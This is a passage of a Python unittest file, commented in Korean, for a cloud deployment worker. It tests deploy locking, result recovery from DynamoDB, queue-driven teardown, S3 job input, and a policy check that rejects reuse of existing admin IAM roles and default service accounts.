        code, out = self.run_worker("deploy", self.write_job(), **env)
        self.assertEqual(code, 2, out)
        self.assertIn("다른 작업이 진행 중", out)
        self.assertFalse((self.work / "dep-test-ec2").exists(), "잠금을 못 잡으면 아무것도 하지 않음")
        self.assertEqual(self.run_worker("destroy", "dep-test-ec2", **env)[0], 1, "삭제도 다음 점검으로 미룸")

        # 잡고 있던 워커가 죽어 임대 시간이 지났으면 이어서 진행
        held["lease_until"] = {"N": str(int(time.time()) - 1)}
        self.aws_db.write_text(json.dumps({"lock#dep-test-ec2": held}), encoding="utf-8")
        code, out = self.run_worker("deploy", self.write_job(), **env)
        self.assertEqual(code, 0, out)
        self.assertNotIn("lock#dep-test-ec2", self.db())
        self.assertEqual(self.db()["dep-test-ec2"]["status"], {"S": "running"})

    def test_new_worker_resumes_result_from_dynamodb(self):
        # 컨테이너가 바뀌어 로컬 work/ 가 없어도, DynamoDB 결과를 이어받아 실패한 클라우드만 재시도해야 함
        env = self.aws_env(PAWPLOY_STATUS_TABLE="t")
        targets = [{"cloud": "aws", "architecture": "ec2", "image_uri": AWS_IMAGE},
                   {"cloud": "gcp", "image_uri": GCP_IMAGE}]
        code, out = self.run_worker("deploy", self.write_targets(targets), FAKE_TF_FAIL="apply",
                                    FAKE_TF_FAIL_CLOUD="gcp", **env)
        self.assertEqual(code, 1, out)
        first_expiry = self.result("dep-multi")["expires_at"]
        shutil.rmtree(self.work)   # 새 컨테이너

        code, out = self.run_worker("deploy", self.write_targets(targets, name="again.json"), **env)
        self.assertEqual(code, 2, out)
        self.assertIn("aws status=running", out, "다른 워커가 띄운 AWS 도 살아 있는 것으로 알아야 함")

        code, out = self.run_worker("deploy", self.write_targets([targets[1]], name="retry.json"), **env)
        self.assertEqual(code, 0, out)
        item = self.db()["dep-multi"]
        self.assertEqual(item["status"], {"S": "running"})
        self.assertEqual(set(item["targets"]["M"]), {"aws", "gcp"}, "AWS 결과가 사라지면 안 됨")
        self.assertEqual(item["expires_at"], {"S": first_expiry})

    def test_drain_destroy_queue_destroys_expired_and_drops_bad_messages(self):
        env = self.aws_env()
        self.assertEqual(self.run_worker("deploy", self.write_job(), **env)[0], 0)
        self.aws_sqs.write_text(json.dumps([
            json.dumps({"action": "destroy", "deploy_id": "dep-test-ec2", "project_id": "prj_test"}),
            "not json",
        ]), encoding="utf-8")

        code, out = self.run_worker("drain-destroy-queue",
                                    "https://sqs.ap-northeast-2.amazonaws.com/123456789012/pawploy-destroy", **env)
        self.assertEqual(code, 0, out)
        self.assertEqual(self.result()["status"], "destroyed")
        deletes = self.aws_calls("sqs", "delete-message")
        self.assertEqual(len(deletes), 2, "처리한 메시지와 잘못된 메시지 모두 지움")
        self.assertIn("ap-northeast-2", deletes[0], "리전은 큐 주소에서")

    # ---------- 권한 탈취 차단 · S3 입력 · 정기 실행 ----------

    def test_policy_blocks_reusing_existing_roles_and_accounts(self):
        sys.path.insert(0, str(ROOT))
        from tfworker import policy
        tags = {"tags_all": {t: "v" for t in policy.REQUIRED_TAGS}}

        def change(address, rtype, after, unknown=None):
            return {"address": address, "mode": "managed", "type": rtype,
                    "change": {"actions": ["create"], "after": after, "after_unknown": unknown or {}}}

        # 이 배포에서 만드는 역할·프로필은 plan 시점에 "알 수 없음" → 통과
        ok = [change("module.app.aws_instance.app", "aws_instance",
                     {"instance_type": "t3.small", **tags}, {"iam_instance_profile": True}),
              change("module.app.aws_iam_instance_profile.app", "aws_iam_instance_profile", tags, {"role": True})]
        self.assertEqual(policy.find_violations({"resource_changes": ok}, "ec2"), [])

        # 계정에 이미 있는 관리자 프로필·역할을 이름으로 적으면 → 거부
        bad = [change("module.app.aws_instance.app", "aws_instance",
                      {"instance_type": "t3.small", "iam_instance_profile": "AdminProfile", **tags}),
               change("module.app.aws_iam_instance_profile.app", "aws_iam_instance_profile",
                      {"role": "OrganizationAdmin", **tags}),
               change("aws_scheduler_schedule.expire", "aws_scheduler_schedule", tags),            # 루트: 허용
               change("module.app.aws_scheduler_schedule.x", "aws_scheduler_schedule", tags)]      # 모듈: 거부
        v = "\n".join(policy.find_violations({"resource_changes": bad}, "ec2"))
        for expected in ("AdminProfile", "OrganizationAdmin", "module.app.aws_scheduler_schedule.x"):
            self.assertIn(expected, v)
        self.assertNotIn("aws_scheduler_schedule.expire:", v, "워커 루트의 만료 예약은 허용")
        v = "\n".join(policy.find_violations({"resource_changes": [change(
            "module.app.aws_lambda_function.app", "aws_lambda_function",
            {"role": "arn:aws:iam::123456789012:role/admin", "memory_size": 512, "timeout": 30, **tags})]}, "lambda"))
        self.assertIn("role/admin", v)

        # Cloud Run: 이 배포에서 만든 계정만. 지정 안 하면(기본 Compute 계정 = 편집자) 거부
        labels = {"terraform_labels": {k: "v" for k in policy.REQUIRED_LABELS}}

        def run(sa):
            template = {"scaling": [{"max_instance_count": 1}], "containers": [{"resources": [{"limits": {"memory": "1Gi"}}]}]}
            if sa:
                template["service_account"] = sa
            return {"resource_changes": [
                change("module.app.google_service_account.app", "google_service_account", {"account_id": "pp-dep-x"}),
                change("module.app.google_cloud_run_v2_service.app", "google_cloud_run_v2_service",
                       {"deletion_protection": False, "template": [template], **labels})]}

        self.assertEqual(policy.find_violations(run("pp-dep-x@proj-1234.iam.gserviceaccount.com"), "cloud_run"), [])
        self.assertIn("기본 계정", "\n".join(policy.find_violations(run(None), "cloud_run")))
        self.assertIn("이 배포에서 만든 계정이 아님", "\n".join(policy.find_violations(
            run("123456-compute@developer.gserviceaccount.com"), "cloud_run")))

    def test_iac_blocks_literal_roles_and_accounts(self):
        sys.path.insert(0, str(ROOT))
        from tfworker import iac
        run = (ROOT / "modules" / "cloud_run" / "main.tf").read_text(encoding="utf-8")
        bad = run.replace("service_account = google_service_account.app.email",
                          'service_account = "123456-compute@developer.gserviceaccount.com"')
        self.assertIn("service_account 에 문자열", "\n".join(iac.check_code(bad, "gcp", "cloud_run")))
        ec2 = (ROOT / "modules" / "ec2" / "main.tf").read_text(encoding="utf-8")
        bad = ec2.replace("iam_instance_profile        = aws_iam_instance_profile.app.name",
                          'iam_instance_profile        = "AdminProfile"')
        self.assertIn("iam_instance_profile 에 문자열", "\n".join(iac.check_code(bad, "aws", "ec2")))

    def test_job_can_be_read_from_s3(self):
        job = json.loads(Path(self.write_job()).read_text(encoding="utf-8"))
        env = self.aws_env(FAKE_AWS_S3_BODY=json.dumps(job))
        code, out = self.run_worker("deploy", "s3://pawploy-jobs/prj_test/dep-test-ec2.json", **env)
        self.assertEqual(code, 0, out)
        self.assertEqual(self.result()["status"], "running")
        cp = self.aws_calls("s3", "cp")
        self.assertEqual(cp[0][2:4], ["s3://pawploy-jobs/prj_test/dep-test-ec2.json", "-"])

    def test_maintenance_runs_queue_and_sweep(self):
        env = self.aws_env(PAWPLOY_DESTROY_QUEUE_URL="https://sqs.ap-northeast-2.amazonaws.com/123456789012/q")
        self.assertEqual(self.run_worker("deploy", self.write_job(deploy_id="dep-by-queue"), **env)[0], 0)
        self.assertEqual(self.run_worker("deploy", self.write_job(name="b.json", deploy_id="dep-by-sweep"), **env)[0], 0)
        self.aws_sqs.write_text(json.dumps([json.dumps({"action": "destroy", "deploy_id": "dep-by-queue"})]),
                                encoding="utf-8")
        self._set_result("dep-by-sweep", expires_at="2000-01-01T00:00:00Z")

        code, out = self.run_worker("maintenance", **env)
        self.assertEqual(code, 0, out)
        self.assertEqual(self.result("dep-by-queue")["status"], "destroyed", "만료 큐로 삭제")
        self.assertEqual(self.result("dep-by-sweep")["status"], "destroyed", "sweep 으로 삭제")

    def test_consume_processes_deploy_destroy_and_bad_messages(self):
        job = json.loads(Path(self.write_job(deploy_id="dep-from-queue")).read_text(encoding="utf-8"))
        env = self.aws_env(FAKE_AWS_S3_BODY=json.dumps(job), PAWPLOY_MAINTENANCE_INTERVAL_SEC="3600")
        self.aws_sqs.write_text(json.dumps([
            json.dumps({"action": "deploy", "job_uri": "s3://bkt/jobs/dep-from-queue/1.json"}),
            json.dumps({"action": "destroy", "deploy_id": "dep-from-queue"}),
            json.dumps({"action": "reboot-everything"}),
        ]), encoding="utf-8")

        code, out = self.run_worker("consume", "https://sqs.ap-northeast-2.amazonaws.com/123456789012/pawploy-jobs.fifo",
                                    "--once", **env)
        self.assertEqual(code, 0, out)
        self.assertIn("▶ deploy s3://bkt/jobs/dep-from-queue/1.json", out)
        self.assertIn("잘못된 메시지 → 삭제", out)
        self.assertEqual(self.result("dep-from-queue")["status"], "destroyed", "배포 뒤 같은 배포 삭제까지 순서대로")
        self.assertEqual(len(self.aws_calls("sqs", "delete-message")), 3, "처리한 메시지·잘못된 메시지 모두 삭제")
        self.assertIn("ap-northeast-2", self.aws_calls("sqs", "receive-message")[0], "리전은 큐 주소에서")

    def test_dynamodb_attr_roundtrip(self):
        sys.path.insert(0, str(ROOT))
        from tfworker import store
        value = {"s": "x", "n": 3, "f": 1.5, "b": True, "none": None, "l": [1, "a"], "m": {"k": "v"}}
        self.assertEqual(store.from_attr(store.to_attr(value)), value)
        self.assertEqual(store.to_attr(True), {"BOOL": True}, "bool 이 숫자로 저장되면 안 됨")

    def test_s3_backend_args_include_lockfile_and_cloud(self):
        sys.path.insert(0, str(ROOT))
        from tfworker import render
        args = render.backend_args({"state_bucket": "b", "project_id": "p", "deploy_id": "d", "cloud": "gcp",
                                    "region": "asia-northeast3", "state_region": "ap-northeast-2"})
        self.assertIn("-backend-config=use_lockfile=true", args)
        self.assertIn("-backend-config=key=deployments/p/d/gcp.tfstate", args)
        self.assertIn("-backend-config=region=ap-northeast-2", args, "GCP 배포의 state 도 S3(AWS 리전)에 둔다")
        self.assertEqual(render.backend_args({"state_bucket": None}), [])


AWS_IMAGE = "123456789012.dkr.ecr.ap-northeast-2.amazonaws.com/pawploy-sample:latest"
GCP_IMAGE = "asia-northeast3-docker.pkg.dev/pawploy-demo/pawploy/pawploy-sample@sha256:" + "b" * 64


if __name__ == "__main__":
    unittest.main()
